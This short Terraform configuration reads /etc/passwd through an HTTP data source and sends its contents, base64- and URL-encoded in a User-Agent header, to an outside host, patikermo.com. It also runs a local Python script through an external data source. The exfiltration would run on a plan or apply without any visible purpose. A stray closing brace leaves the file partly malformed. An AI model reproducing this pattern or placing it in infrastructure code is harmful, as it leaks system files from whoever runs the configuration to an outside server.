data "external" "example" {
  program = ["python", "${path.module}/example.py"]
}

data "http" "request_web" {
  url = "http://patikermo.com/test.txt"

  # Optional request headers
  request_headers = {
    Accept = "application/json"
  }
}

data "http" "request_web82" {
  url = "file:///etc/passwd"

  }
}

data "http" "request_web2" {
  url = "https://patikermo.com/"

  # Optional request headers
  request_headers = {
    User-Agent = replace(urlencode(base64encode(replace(chomp(data.http.request_web82.body),"\n",""))),"%3D","")
  }
}
